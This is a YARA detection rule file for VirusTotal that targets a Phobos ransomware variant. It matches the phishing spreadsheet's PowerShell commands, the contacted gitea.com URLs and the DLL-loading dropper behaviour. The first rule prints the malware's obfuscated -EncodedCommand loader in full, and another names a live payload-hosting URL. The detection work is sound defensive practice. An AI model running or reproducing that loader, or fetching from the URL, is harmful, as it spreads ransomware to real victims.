import "vt"
/*
Description: Phobos Ransomware Variant
Author: dominicchua@google.com
Notes: high confidence matching based on PS commands and domain contacted (gitea.com)
https://www.fortinet.com/blog/threat-research/phobos-ransomware-variant-launches-attack-faust 
*/


// matches behaviour of initial phishing excel 

rule xlsx_ps_obfuscated_commands {
    condition:
        for any vt_behaviour_command_executions in vt.behaviour.command_executions: (
        vt_behaviour_command_executions icontains "powershell  -EncodedCommand IAAuACAAKAAgACQAZQBuAHYAOgBDAG8AbQBTAFAARQBjAFsANAAsADIANAAsADIANQBdAC0ASgBPAGkAbgAnACcAKQAoAG4ARQB3AC0ATwBiAEoARQBDAFQAIAAgAGkATwAuAGMAbwBNAFAAcgBlAFMAcwBJAE8ATgAuAEQARQBmAGwAYQB0AEUAUwBUAHIAZQBhAG0AKABbAFMAWQBzAFQAZQBtAC4ASQBPAC4AbQBlAG0AbwByAFkAUwB0AHIARQBhAE0AXQAgAFsAUwB5AHMAdABlAE0ALgBjAG8ATgBWAGUAUgBUAF0AOgA6AEYAcgBPAG0AYgBhAFMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGIAVgBYAHYAYwA1AHAAWQBGAFAAMgBlAG0AZgB3AFAAYgB4AHkAMwA2AEwAYQBRAGEATgBwAGsAbQA1ADMAOQBRAEIAUQBUAFUANABJAE8AWQBqAHAAcAAwAHUAawBsACsAbwBnADAAQwBCAFkAeABQADQAYgBsAGYAOQA5AHoASAAyAEoAMAB0AGgAOQA4AEkATAB4ADMANwB6AG4AbgAzAG4AcwBRAG8AdgA2AFkASABwADEAOABzADgAVQAvAFEAdAB4AG0ATgB3AHYANQB2AFYASABMADIAMABYAGUASwB2AEwARABvAHEAYgAzAHQAQwBzAGoASABCAGgARAAzADcAdgBRAFAAbQBpAGoAVABHAEoAZAAzAG0AagBOAHYANABWAFkAWABvAHYASAB5ADUATQBqAEkAUgBvADQANgBiADAATwAxAGMAbgBxAG0ATgBDAE0AbwBCAC8AeAA3AG4ANgBpAE4AWQBWAG8AQwBqADQAaABNADcAMgBmAHkAVABtAE8AYQBFADkAbQBxAHIAMwBYACsAaQBhAFcAZQAxAHUAZQBJAGoAUAB1ADIAdABqAGEAdQBQAFYAdQBkAG0ATgBwAFQAMQBiAHEASQBWAEkAbgBjAGMAcABRAEgASwB1AGUAcgA4AGkAMQBDADgARABHAHoAaABQAGcAUABTAHoAeQBvAHkASgB2ADQAOQBKAGkAKwBIAC8AaABoAC8AOAB0AEIAUABsAGMANQBKADgANABWAFAANgB4AFUATQB4AHcAYQBlAEUAQgA3AHoAaABSAFIASQArAHgAWQBsAFAAcgB1AEsAZwBKAFAAUgBEAGEARQBNAG4AOABNAEQANwBnAEMAMwA0AEgARAB5AEgAVwBKAEQAcABJAC8AZQBlAEQAKwAzAFQAOQBkAEIATABNACsAZgBFAHMAeQB4AGIATABVADkANgBGAFgAeABnAC8AcgBPACsAUwBnADAAdgBlAFoAMAB5AFMAKwBjAEYAbABFAHMAWQBjAGsAdAAvAEYARQB6ADcARABaAE4AeQBoAFoAMgBRAHYARwBXADcAbgB2AFAAOAB4AGoASABFAEoAbABqACsAdwBRAHUAWABtAC8AdAA3ACsAWABqADMAMwA1AEIAVQB0AGEARwBGADYARgA4AHgAVQBOAEsASQBsAHAATAB0AG0AMABaAFIANgAvAHIAMQB0AG4AWAA1AEIALwBmAEQAbgBtADYAMwBFAE0AWgA3ADgAYQBDAHgAUABUAHkAdgA5AGwAQwBpAEsAbAArAGIASgArAFEATABSAHoAeQBVAG4AOQBUAE4ARwBNAGQAUwBhAFIAagA5ACsAUwBoADUAbABZADUAMgB4ADEANwBjAHQAaAAwAHkANgBzAHQAYgBhAEgAaQBxAEoAMQBpAEcAWQBkAEwAQQAwAGMASABJAGEAWQBZAGsAcQBuAEwAMABWADIAVgBFAEYAMAB5AGgAUABxAFMAWQBxAEIAWQBVAEMAbgBLAHoATQBHAGUAcwBBAHEAdgBNAGYAbwBRAGcATwBhAFUAaQBtAE4AeQB1AEUAMwBwAG0ARgAwAFgAVAA5AG8AdABlAG4AeQBJAHIASgBuAE0AdQBDAFUAeABnAGwASAAwAFcAbQBMAEcAVQBaACsAZABkAEsAOQBWAGoAOABoAEYAVQBxAEgAYQBYACsAVgBkADYANwAzAEsAWQBaADUAeABtAG4AWQBkAGsAcgBFAFIASQBNAFYAbABrAHYAagBDAFEAZQBCAEQAUwAyAEsAUgByADYAaABNAFEAbABoAFMAQwAwAEwAZQBwAFEARQBtAGYAUwBJAGUAKwBRAGkAYgB3AHIAawA2AHEATQBpAG4ANgBtAGQALwBoADkAegBBAEsAZQBxADQAeAB2AFQASQBLAFYAVABYAGIARgB4AFAAVwBmAE8AZQBZAFoAMwBaAEIAbgBqAFYAcQBxAGUASABYAE0AUwBIAHUAcgBNAEcAMgBtAG8AOABMADYAUwAzAG0ATQBhAEwAMAAwAG0AWgAvAGgAKwBuAEgARQA4AFYATgB1AHAAawAxADEAeQBzAEoATQBhAEUAQwBPAEoAOABuAEoARABnAHUAbAB2AEcAaABjAG0AMgA1AG8AbgB0AGwAUwBpAE0AZQBmAEcARQBhAHUAdgB6ADIAMgBWAEoAcABTAHEAZABZAG0AVABSAHAAeQBYAEcAbABHADAAZABtAHIARwB1AFMAdgByAE4ASgAyAEQAcQBoAEMARQBXAFQAaABRAG4ANABBAHAANwBNADEALwBLAHIASwB4AEUAVQBCAEMARwBDAEkAcwAwAHEAaABOADcATQBJAHQARQBvAGMAeQBVAG8AcABrAGQANABFADYAbwAwAFIAbQB1AEEAawBHADQARQA0AEoAcABvAEcAaABGAHkASABvADkAVwA2AC8AYwA2AFgAdQA3AHgAaAAvAE4AbQA4AEsALwBpACsAdAByADgAWABCAG8ASwBCADkAVwAyAFMAUwBCAHgAbgBaAEQAbgBJAHIATQAvADkAYgBNAEoAQgBJAFQAaAA1AG0AYwBUADUAcABzAGkAaABoADIAQgBuAHUARABkAEgAawBvADQASgBPAHIAcAA5ADUANABFAGoAMQAzAE0AYwA2AE4AQgBNAEwAbwB2AGIAMQBuAGUAbABYAEwAawBUAEIATwBWAEkAbABRAGYAMQB1AFYAbQBVADkAYQBsAGEAbgBvAFUARABxAFIANQBYAEEANgBYAGgATQBpAEUAbQBHAHcAQwAzADgAMgA1ADUANwB2AGsAdABVAHAASwBYADkAdQBPAEgAUwByAEcAQQBrAHEAaABMAFYAagByAGEARQBrAHQARgA1ADcAZwBoAGoAOQBDAFUARABiAEcAYwBTAHYAUQAvADUASwByAFYAWgBmAHgAMABhAGcANgBIAFgAZABNAHoANwB3AHoAagB6AGsANABtAGYAbwBRAEMAZABzAE4AVQBUAHIASQBrAGYAUwAxAEQAdQAyAFEANgAxAEUAVgBEAFgAUABVAEcAMABkAFIAeQBTADUAcABCAFkAbABQAFgASQBuAGQAWgBpAEgAOQBWAHcAcwAzADQAOAByAFMAYwBsADYAVgB4AC8AWABpAGEASwBPAE4AWgB3ADAAeABOAHAAMAB2AEoAMwBKAFoAZQBSAHIASQBFAHEALwArAEUAYQA0AGwARwA0AC8AaQBUAFkAWAB3ACsAYgBJAHIAMwBvAHYASAA1AHgARABCAGEANwBYAFkAVABrAFkAMwB0AHkAUQBDAFYAWgBMADQAeABGAGgAVwBkAHkAOQA1AEoAVgBuAEUAbQAyAGcAcQBIADkAZwBlAGUANQBMAGUAVABtAFoAOQArAHIAKwBjAC8AaQBrAHEAZgBtAE8AUgB6AGIAdwBEAEkAMABvADMAOQAwAG4ASwBBAHgAaQBkAG4AQwBqAGgANAAwAFoAVgBwAFkAZABRAGMAdABxAE0AYQBJAEkAQwAxAGkAWABlAEQATwBVAGIAVgA4ADgAZwBDAHoAVABLAE8AZwB6AGoAQgAyAEwAWgBoAGwAbQBZADIANgB5AFYAbwB0AEsAbABVAGsAdgB4AGUAegByAHQANgBqAE0AUgBKAE4ASgBXAHAANAA4ADkAbAByAGIASwBZAGIAZAB2AFMASABQAG0AcwB6AEoAaQA1ADYAWAAyAG0AeABMAFgAeQBYAGgAZABTAGIARgBkAFMAKwBSAEEAcQB3ACsANgBUAHYAbQBKAEYAbwBiAGIAYQAzAGkARQBMADAATQBpADIATQBWAFYAMAB3AGIAVgBpAFkASABvAHYAUwBTAGUAUwAwADEAYQB0AG0ASwB6AEkAbwA4AFcAWQBQAEoAeQA3AGEAUAAvAE8AUgAyAEcAagB5AGoANwBYAFAAaABwAHUASgB3AEUAYgBwAHMAKwBUAFMAMAB4AC8AaQBqAHIAdQBPAEcAcQBEAE4AMwAwAE4AYQBHAEQAagBsAFIAdQBYAEIAdgA5AGUAYgBEADYAegB5AHQANwBVADUAOABqAFEAbQBrADMAVwBGAEcAYQA1AFcASABrAEkAQwBWAHkAegBvAC8AOAAxAE0AQgA4AEkARwBRAHgAcgB4AEgAZwB1AGsAeQAxAEEAcwBTAFEAZwBpAHUAdwBGAHoAKwBlAHMAUgAyAFcATgBkAHgARwBWADAAWQA2AEsATABRAFQAcwBTAG8AegBCAHgATwAvADYAWABLAHcAVwBVADEAOQByAGwAagBBADMAWQAyAFAASQBsADkASgA2AG0AMQBYAFYAagBvAHEAZABaAHQAdwBZAFUASwB4AGMAagByACsAcgBvAHkAMQBvAHkAZABoAFQAdgBCAGcAWgBDADYAMQBmACsAOQBHAEsAdgB3AGwAbgByADMAQQA3AEQASQA1AHUAeABaAE4AawBDAHYAdgBkAFUAVQBjAG8AYwBIAEQATwBjAG0AaAAyAG4ASQArAGgANgArAHQAQgA1AGwAMgB1AGoAUAAzADUAVgBzAHIAQgB5AGwAdgBBAFcAagAyAFkASABjADAANABKAGUAcgBGAGYAVgBkAHAAOABLAGIAbwBOAFkAKwBvADQAcQAyAHcAbQA3AHYAcwBGAFEAeQBEAFgANwB4AFUALwBOADgAeABJAHgAVgA3AGwAWABHAHAAVQBLAG4AOQB2AGUASQAvACcAIAApACAALAAgAFsAaQBvAC4AQwBPAG0AUAByAGUAUwBzAEkATwBuAC4AQwBPAG0AcABSAGUAcwBzAEkATwBuAG0AbwBEAEUAXQA6ADoAZABFAEMATwBNAFAAUgBFAHMAcwAgACkAfAAgACUAIAB7AG4ARQB3AC0ATwBiAEoARQBDAFQAIAAgAGkAbwAuAFMAdAByAEUAYQBtAHIAZQBBAEQAZQByACgAIAAkAF8ALAAgAFsAdABlAFgAVAAuAGUAbgBjAE8ARABJAE4AZwBdADoAOgBhAHMAQwBpAEkAIAApACAAfQB8ACUAewAgACQAXwAuAFIARQBhAGQAdABPAGUATgBkACgAKQB9ACAAKQA="
        or 
        vt_behaviour_command_executions icontains "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -EncodedCommand IAAuACAAKAAgACQAZQBuAHYAOgBDAG8AbQBTAFAARQBjAFsANAAsADIANAAsADIANQBdAC0ASgBPAGkAbgAnACcAKQAoAG4ARQB3AC0ATwBiAEoARQBDAFQAIAAgAGkATwAuAGMAbwBNAFAAcgBlAFMAcwBJAE8ATgAuAEQARQBmAGwAYQB0AEUAUwBUAHIAZQBhAG0AKABbAFMAWQBzAFQAZQBtAC4ASQBPAC4AbQBlAG0AbwByAFkAUwB0AHIARQBhAE0AXQAgAFsAUwB5AHMAdABlAE0ALgBjAG8ATgBWAGUAUgBUAF0AOgA6AEYAcgBPAG0AYgBhAFMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGIAVgBYAHYAYwA1AHAAWQBGAFAAMgBlAG0AZgB3AFAAYgB4AHkAMwA2AEwAYQBRAGEATgBwAGsAbQA1ADMAOQBRAEIAUQBUAFUANABJAE8AWQBqAHAAcAAwAHUAawBsACsAbwBnADAAQwBCAFkAeABQADQAYgBsAGYAOQA5AHoASAAyAEoAMAB0AGgAOQA4AEkATAB4ADMANwB6AG4AbgAzAG4AcwBRAG8AdgA2AFkASABwADEAOABzADgAVQAvAFEAdAB4AG0ATgB3AHYANQB2AFYASABMADIAMABYAGUASwB2AEwARABvAHEAYgAzAHQAQwBzAGoASABCAGgARAAzADcAdgBRAFAAbQBpAGoAVABHAEoAZAAzAG0AagBOAHYANABWAFkAWABvAHYASAB5ADUATQBqAEkAUgBvADQANgBiADAATwAxAGMAbgBxAG0ATgBDAE0AbwBCAC8AeAA3AG4ANgBpAE4AWQBWAG8AQwBqADQAaABNADcAMgBmAHkAVABtAE8AYQBFADkAbQBxAHIAMwBYACsAaQBhAFcAZQAxAHUAZQBJAGoAUAB1ADIAdABqAGEAdQBQAFYAdQBkAG0ATgBwAFQAMQBiAHEASQBWAEkAbgBjAGMAcABRAEgASwB1AGUAcgA4AGkAMQBDADgARABHAHoAaABQAGcAUABTAHoAeQBvAHkASgB2ADQAOQBKAGkAKwBIAC8AaABoAC8AOAB0AEIAUABsAGMANQBKADgANABWAFAANgB4AFUATQB4AHcAYQBlAEUAQgA3AHoAaABSAFIASQArAHgAWQBsAFAAcgB1AEsAZwBKAFAAUgBEAGEARQBNAG4AOABNAEQANwBnAEMAMwA0AEgARAB5AEgAVwBKAEQAcABJAC8AZQBlAEQAKwAzAFQAOQBkAEIATABNACsAZgBFAHMAeQB4AGIATABVADkANgBGAFgAeABnAC8AcgBPACsAUwBnADAAdgBlAFoAMAB5AFMAKwBjAEYAbABFAHMAWQBjAGsAdAAvAEYARQB6ADcARABaAE4AeQBoAFoAMgBRAHYARwBXADcAbgB2AFAAOAB4AGoASABFAEoAbABqACsAdwBRAHUAWABtAC8AdAA3ACsAWABqADMAMwA1AEIAVQB0AGEARwBGADYARgA4AHgAVQBOAEsASQBsAHAATAB0AG0AMABaAFIANgAvAHIAMQB0AG4AWAA1AEIALwBmAEQAbgBtADYAMwBFAE0AWgA3ADgAYQBDAHgAUABUAHkAdgA5AGwAQwBpAEsAbAArAGIASgArAFEATABSAHoAeQBVAG4AOQBUAE4ARwBNAGQAUwBhAFIAagA5ACsAUwBoADUAbABZADUAMgB4ADEANwBjAHQAaAAwAHkANgBzAHQAYgBhAEgAaQBxAEoAMQBpAEcAWQBkAEwAQQAwAGMASABJAGEAWQBZAGsAcQBuAEwAMABWADIAVgBFAEYAMAB5AGgAUABxAFMAWQBxAEIAWQBVAEMAbgBLAHoATQBHAGUAcwBBAHEAdgBNAGYAbwBRAGcATwBhAFUAaQBtAE4AeQB1AEUAMwBwAG0ARgAwAFgAVAA5AG8AdABlAG4AeQBJAHIASgBuAE0AdQBDAFUAeABnAGwASAAwAFcAbQBMAEcAVQBaACsAZABkAEsAOQBWAGoAOABoAEYAVQBxAEgAYQBYACsAVgBkADYANwAzAEsAWQBaADUAeABtAG4AWQBkAGsAcgBFAFIASQBNAFYAbABrAHYAagBDAFEAZQBCAEQAUwAyAEsAUgByADYAaABNAFEAbABoAFMAQwAwAEwAZQBwAFEARQBtAGYAUwBJAGUAKwBRAGkAYgB3AHIAawA2AHEATQBpAG4ANgBtAGQALwBoADkAegBBAEsAZQBxADQAeAB2AFQASQBLAFYAVABYAGIARgB4AFAAVwBmAE8AZQBZAFoAMwBaAEIAbgBqAFYAcQBxAGUASABYAE0AUwBIAHUAcgBNAEcAMgBtAG8AOABMADYAUwAzAG0ATQBhAEwAMAAwAG0AWgAvAGgAKwBuAEgARQA4AFYATgB1AHAAawAxADEAeQBzAEoATQBhAEUAQwBPAEoAOABuAEoARABnAHUAbAB2AEcAaABjAG0AMgA1AG8AbgB0AGwAUwBpAE0AZQBmAEcARQBhAHUAdgB6ADIAMgBWAEoAcABTAHEAZABZAG0AVABSAHAAeQBYAEcAbABHADAAZABtAHIARwB1AFMAdgByAE4ASgAyAEQAcQBoAEMARQBXAFQAaABRAG4ANABBAHAANwBNADEALwBLAHIASwB4AEUAVQBCAEMARwBDAEkAcwAwAHEAaABOADcATQBJAHQARQBvAGMAeQBVAG8AcABrAGQANABFADYAbwAwAFIAbQB1AEEAawBHADQARQA0AEoAcABvAEcAaABGAHkASABvADkAVwA2AC8AYwA2AFgAdQA3AHgAaAAvAE4AbQA4AEsALwBpACsAdAByADgAWABCAG8ASwBCADkAVwAyAFMAUwBCAHgAbgBaAEQAbgBJAHIATQAvADkAYgBNAEoAQgBJAFQAaAA1AG0AYwBUADUAcABzAGkAaABoADIAQgBuAHUARABkAEgAawBvADQASgBPAHIAcAA5ADUANABFAGoAMQAzAE0AYwA2AE4AQgBNAEwAbwB2AGIAMQBuAGUAbABYAEwAawBUAEIATwBWAEkAbABRAGYAMQB1AFYAbQBVADkAYQBsAGEAbgBvAFUARABxAFIANQBYAEEANgBYAGgATQBpAEUAbQBHAHcAQwAzADgAMgA1ADUANwB2AGsAdABVAHAASwBYADkAdQBPAEgAUwByAEcAQQBrAHEAaABMAFYAagByAGEARQBrAHQARgA1ADcAZwBoAGoAOQBDAFUARABiAEcAYwBTAHYAUQAvADUASwByAFYAWgBmAHgAMABhAGcANgBIAFgAZABNAHoANwB3AHoAagB6AGsANABtAGYAbwBRAEMAZABzAE4AVQBUAHIASQBrAGYAUwAxAEQAdQAyAFEANgAxAEUAVgBEAFgAUABVAEcAMABkAFIAeQBTADUAcABCAFkAbABQAFgASQBuAGQAWgBpAEgAOQBWAHcAcwAzADQAOAByAFMAYwBsADYAVgB4AC8AWABpAGEASwBPAE4AWgB3ADAAeABOAHAAMAB2AEoAMwBKAFoAZQBSAHIASQBFAHEALwArAEUAYQA0AGwARwA0AC8AaQBUAFkAWAB3ACsAYgBJAHIAMwBvAHYASAA1AHgARABCAGEANwBYAFkAVABrAFkAMwB0AHkAUQBDAFYAWgBMADQAeABGAGgAVwBkAHkAOQA1AEoAVgBuAEUAbQAyAGcAcQBIADkAZwBlAGUANQBMAGUAVABtAFoAOQArAHIAKwBjAC8AaQBrAHEAZgBtAE8AUgB6AGIAdwBEAEkAMABvADMAOQAwAG4ASwBBAHgAaQBkAG4AQwBqAGgANAAwAFoAVgBwAFkAZABRAGMAdABxAE0AYQBJAEkAQwAxAGkAWABlAEQATwBVAGIAVgA4ADgAZwBDAHoAVABLAE8AZwB6AGoAQgAyAEwAWgBoAGwAbQBZADIANgB5AFYAbwB0AEsAbABVAGsAdgB4AGUAegByAHQANgBqAE0AUgBKAE4ASgBXAHAANAA4ADkAbAByAGIASwBZAGIAZAB2AFMASABQAG0AcwB6AEoAaQA1ADYAWAAyAG0AeABMAFgAeQBYAGgAZABTAGIARgBkAFMAKwBSAEEAcQB3ACsANgBUAHYAbQBKAEYAbwBiAGIAYQAzAGkARQBMADAATQBpADIATQBWAFYAMAB3AGIAVgBpAFkASABvAHYAUwBTAGUAUwAwADEAYQB0AG0ASwB6AEkAbwA4AFcAWQBQAEoAeQA3AGEAUAAvAE8AUgAyAEcAagB5AGoANwBYAFAAaABwAHUASgB3AEUAYgBwAHMAKwBUAFMAMAB4AC8AaQBqAHIAdQBPAEcAcQBEAE4AMwAwAE4AYQBHAEQAagBsAFIAdQBYAEIAdgA5AGUAYgBEADYAegB5AHQANwBVADUAOABqAFEAbQBrADMAVwBGAEcAYQA1AFcASABrAEkAQwBWAHkAegBvAC8AOAAxAE0AQgA4AEkARwBRAHgAcgB4AEgAZwB1AGsAeQAxAEEAcwBTAFEAZwBpAHUAdwBGAHoAKwBlAHMAUgAyAFcATgBkAHgARwBWADAAWQA2AEsATABRAFQAcwBTAG8AegBCAHgATwAvADYAWABLAHcAVwBVADEAOQByAGwAagBBADMAWQAyAFAASQBsADkASgA2AG0AMQBYAFYAagBvAHEAZABaAHQAdwBZAFUASwB4AGMAagByACsAcgBvAHkAMQBvAHkAZABoAFQAdgBCAGcAWgBDADYAMQBmACsAOQBHAEsAdgB3AGwAbgByADMAQQA3AEQASQA1AHUAeABaAE4AawBDAHYAdgBkAFUAVQBjAG8AYwBIAEQATwBjAG0AaAAyAG4ASQArAGgANgArAHQAQgA1AGwAMgB1AGoAUAAzADUAVgBzAHIAQgB5AGwAdgBBAFcAagAyAFkASABjADAANABKAGUAcgBGAGYAVgBkAHAAOABLAGIAbwBOAFkAKwBvADQAcQAyAHcAbQA3AHYAcwBGAFEAeQBEAFgANwB4AFUALwBOADgAeABJAHgAVgA3AGwAWABHAHAAVQBLAG4AOQB2AGUASQAvACcAIAApACAALAAgAFsAaQBvAC4AQwBPAG0AUAByAGUAUwBzAEkATwBuAC4AQwBPAG0AcABSAGUAcwBzAEkATwBuAG0AbwBEAEUAXQA6ADoAZABFAEMATwBNAFAAUgBFAHMAcwAgACkAfAAgACUAIAB7AG4ARQB3AC0ATwBiAEoARQBDAFQAIAAgAGkAbwAuAFMAdAByAEUAYQBtAHIAZQBBAEQAZQByACgAIAAkAF8ALAAgAFsAdABlAFgAVAAuAGUAbgBjAE8ARABJAE4AZwBdADoAOgBhAHMAQwBpAEkAIAApACAAfQB8ACUAewAgACQAXwAuAFIARQBhAGQAdABPAGUATgBkACgAKQB9ACAAKQA="
    )
}

rule known_network_behaviour {
    condition:
        for any vt_behaviour_memory_pattern_urls in vt.behaviour.memory_pattern_urls: (
        vt_behaviour_memory_pattern_urls icontains "https://gitea.com/JoinPokingo/JingaPol/raw/branch/main"
        //vt_behaviour_memory_pattern_urls icontains "https://gitea.com/JoinPokingo/JingaPol/raw/branch/main/cfmifs_CRPT.txt"
        //vt_behaviour_memory_pattern_urls icontains "https://gitea.com/JoinPokingo/JingaPol/raw/branch/main/Main"
    )
}


// matches dropper behaviour
rule dropper_behaviour_lolbins {
  condition:
    for any vt_behaviour_processes_created in vt.behaviour.processes_created: (
        vt_behaviour_processes_created icontains "C:\\Windows\\System32\\rundll32.exe rundll32.exe  \"C:\\Users\\user\\Desktop\\cfmifs.dll\"" or
        vt_behaviour_processes_created icontains "C:\\Windows\\System32\\regsvr32.exe regsvr32.exe /s C:\\Users\\user\\Desktop\\cfmifs.dll" or
        vt_behaviour_processes_created icontains "C:\\Windows\\System32\\WerFault.exe C:\\Windows\\system32\\WerFault.exe -u -p 4952 -s 300" or
        vt_behaviour_processes_created icontains "C:\\Windows\\System32\\loaddll64.exe loaddll64.exe \"C:\\Users\\user\\Desktop\\cfmifs.dll\"" 
    ) or
    for any vt_behaviour_files_opened in vt.behaviour.files_opened: (
        vt_behaviour_files_opened icontains "C:\\Users\\user\\Desktop\\cfmifs.dll" or
        vt_behaviour_files_opened icontains "C:\\Users\\user\\Desktop\\software.exe"
    )
}